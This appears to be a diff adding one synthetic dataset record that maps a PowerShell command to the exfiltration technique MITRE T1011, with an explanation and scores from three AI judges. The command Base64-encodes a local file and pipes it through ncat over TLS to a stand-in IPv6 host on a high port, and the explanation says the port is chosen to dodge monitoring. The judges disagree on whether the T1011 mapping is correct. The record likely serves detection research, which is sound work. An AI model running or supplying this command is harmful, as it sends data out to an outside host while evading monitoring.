@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
+  "explanation": "Sends Base64-encoded data over an IPv6 TCP connection with TLS using ncat, leveraging a non-standard high port to avoid common monitoring. This uses a different medium than typical corporate IPv4/HTTP flows, aligning with T1011.",
+  "rationale_steps": [
+    "Convert file to Base64 for opaque transfer.",
+    "Exfiltrate via IPv6 TCP with TLS to a rarely used high port, separating from primary channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-c67318d0",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell assignment and pipe are well-formed with balanced quotes and valid ncat flags and IPv6 host/port usage.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly exfiltrates Base64 data over an IPv6 TLS connection to a high port using ncat, this is not a different network medium as required by T1011 (which refers to mediums like cellular, Wi-Fi, or Bluetooth), making the technique mapping weak.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-09-30T23:39:43.387694Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignments, correct PowerShell syntax for conversion and file operations, and valid ncat parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1011 by exfiltrating data over IPv6 with TLS encryption on a non-standard port (60443), effectively using an alternative network medium that would bypass monitoring focused on standard corporate IPv4/HTTP traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:39:46.426360Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell variable assignment, .NET method calls, and command piping are perfectly well-formed, and all `ncat.exe` arguments are valid.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely executes the described T1011 technique by Base64 encoding a file and exfiltrating it via `ncat` over an IPv6 TLS connection to a non-standard port, representing a distinct network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:39:58.738032Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
